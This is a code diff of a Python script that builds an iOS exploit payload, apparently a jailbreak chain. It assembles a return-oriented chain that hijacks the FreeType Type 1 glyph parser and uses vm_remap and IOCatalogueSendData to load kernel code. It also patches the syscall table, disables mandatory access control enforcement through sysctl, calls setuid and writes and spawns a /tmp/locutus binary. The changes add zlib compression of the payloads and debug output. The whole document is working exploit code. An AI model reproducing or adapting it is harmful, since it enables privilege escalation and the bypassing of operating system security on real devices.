@@ -18,10 +18,11 @@ def read(f, size):
 
 def dbg_result():
     # ensure that all of these are 0!
-    if False:
+    if True:
         result, resultp = stackunkpair()
         store_r0_to(resultp)
-        funcall('_printf', ptr('Result for line %d was %%08x\n' % sys._getframe().f_back.f_lineno, True), result)
+        back = sys._getframe().f_back
+        funcall('_printf', ptr('Result for %s:%d was %%08x\n' % (back.f_code.co_filename, back.f_lineno), True), result)
 
 dmini.init(shlex.split(sys.argv[2]))
 
@@ -62,18 +63,16 @@ m.mark()
 heapadd(fwd('R7'), fwd('PC'))
 make_avail()
 
-funcall('_abort', None)
+funcall('_getpid', None)
 
-set_r0_to(reloc(0xe, 0x558))
-#funcall('_abort', None)
+load_r0_from(reloc(0xe, 0x558))
+#load_r0_r0()
 load_r0_r0()
-load_r0_r0()
-load_r0_r0()
-locutus, locutusp = stackunkpair()
-store_r0_to(locutusp)
+zlocutusp, zlocutuspp = stackunkpair()
+store_r0_to(zlocutuspp)
 add_r0_by(reloc(0xc, 0))
-plistp, plistpp = stackunkpair()
-store_r0_to(plistpp)
+zplistp, zplistpp = stackunkpair()
+store_r0_to(zplistpp)
 
 #funcall('_printf', ptr('starting shellcode\n', True))
 
@@ -99,23 +98,27 @@ protp = ptrI(0)
 zerop = ptrI(0)
 thousandp = ptrI(0x1000)
 funcall('_vm_deallocate', mtss.pop(), 0, 0x2000); dbg_result()
-funcall('_vm_remap', mtss.pop(), zerop, 0x1000, 1, 0, mtss.pop(), ldm, 0, protp, protp, 2); dbg_result()
+funcall('_vm_remap', mtss.pop(), zerop, 0x1000, 1, 0, mtss.pop(), ldm & ~0xfff, 0, protp, protp, 2); dbg_result()
 funcall('_vm_remap', mtss.pop(), thousandp, 0x1000, 1, 0, mtss.pop(), stub & ~0xfff, 0, protp, protp, 2); dbg_result()
 funcall('_mlock', 0, 0x2000); dbg_result()
 #funcall('_memcpy', 0x10000000, 0, 0x2000) # XXX
 
 plist = '<array><data>%s</data></array>' % base64.b64encode(kernstuff)
+zplist = zlib.compress(plist, 9)
 
-#funcall('_abort')
-dmini.cur.choose_file('/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit')
-funcall('_IOCatalogueSendData', 0, 1, plistp, len(plist))
-dmini.cur.choose_file('/usr/lib/libSystem.B.dylib')
+funcall('_malloc', len(plist))
+plistp, plistpp = stackunkpair()
+store_r0_to(plistpp)
+dmini.cur.push_file('/usr/lib/libz.dylib')
+funcall('_uncompress', None, ptrI(len(plist)), zplistp, len(zplist))
+dmini.cur.pop_file()
 dbg_result()
 
-#funcall('_strcpy', 0x801f2c84, ptr('You just lost the game.', True))
-#funcall('_printf', ptr('If this works, you won: %s\n', True), 0x801f2c84)
-#funcall('_exit', 0)
-
+#funcall('_abort')
+dmini.cur.push_file('/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit')
+funcall('_IOCatalogueSendData', 0, 1, plistp, len(plist))
+dmini.cur.pop_file()
+dbg_result()
 
 # copy the real code we want to run in the kernel
 weirdfile = open('kcode.bin').read()[:-4] + struct.pack('I', proc_ucred)
@@ -138,8 +141,7 @@ while True:
         continue
     weirdfile += struct.pack('II', addr, len(data)) + data
 
-weirdfile += struct.pack('III', sysent_patch, 4, sysent_patch_orig,)
-weirdfile += '\0\0\0\0'
+weirdfile += struct.pack('IIII', sysent_patch, 4, sysent_patch_orig, 0)
 
 funcall('_memcpy', scratch, ptr(weirdfile), len(weirdfile))
 store_val_to(scratch, sysent_patch)
@@ -156,16 +158,29 @@ O_WRONLY = 0x0001
 O_CREAT  = 0x0200
 O_TRUNC  = 0x0400
 
+funcall('_malloc', reloc(0xa, 0))
+locutusp, locutuspp = stackunkpair()
+store_r0_to(locutuspp)
+dmini.cur.push_file('/usr/lib/libz.dylib')
+funcall('_uncompress', None, ptrI(reloc(0xb, 0)), zlocutusp, reloc(0xa, 0))
+dmini.cur.pop_file()
+dbg_result()
 locutus_str = ptr('/tmp/locutus', True)
 funcall('_open', locutus_str, O_WRONLY | O_CREAT | O_TRUNC, 0755)
 fd, fdp = stackunkpair()
 store_r0_to(fdp)
-funcall('_write', None, locutus, os.path.getsize('../../locutus/locutus'))
+#dbg_result()
+funcall('_write', None, locutusp, reloc(0xb, 0))
+dbg_result()
 funcall('_close', fd)
+dbg_result()
 funcall('_posix_spawn', 0x11000000, locutus_str, 0, 0, ptrI(locutus_str, 0), zerop)
+dbg_result()
 
 funcall('_sysctlbyname', ptr('security.mac.proc_enforce', True), 0, 0, zerop, 4)
+dbg_result()
 funcall('_sysctlbyname', ptr('security.mac.vnode_enforce', True), 0, 0, zerop, 4)
+dbg_result()
 
 funcall('_geteuid')
 funcall('_setuid', None); dbg_result()
@@ -175,20 +190,21 @@ funcall('_setuid', None); dbg_result()
 set_r0_to(1337)
 fancy_set_sp_to(reloc(0xe, 0x60c)) # offset determined by experiment
 
-final, relocs = finalize(reloc(0xd, 0), relocs=True)
+final, relocs = finalize(reloc(0xd, 0))
 
 #heapdump(None)
 
 # add sp, #400; pop {r4, r5, pc}
 parse_callback = dmini.cur.find_basic('+ 64 b0 30 bd').value
-dmini.cur.choose_file('/System/Library/Frameworks/CoreGraphics.framework/Resources/libCGFreetype.A.dylib')
+print hex(parse_callback)
+dmini.cur.push_file('/System/Library/Frameworks/CoreGraphics.framework/Resources/libCGFreetype.A.dylib')
 actual_parse_callback = dmini.cur.private_sym('_T1_Parse_Glyph').value
 
 #print 'len:', len(final), '/ 4 =', len(final)/4
 #print relocs
-print map(hex, struct.unpack('I'*(len(final)/4), final))
+#print map(hex, struct.unpack('I'*(len(final)/4), final))
 
 #final = 'food'*500
 #relocs = {4: 3}
 
-open('catalog.txt', 'w').write(pickle.dumps({'parse_callback': parse_callback, 'actual_parse_callback': actual_parse_callback, 'final': final, 'relocs': relocs, 'plist': plist}))
+open('catalog.txt', 'w').write(pickle.dumps({'parse_callback': parse_callback, 'actual_parse_callback': actual_parse_callback, 'final': final, 'relocs': relocs, 'plist': zplist}))
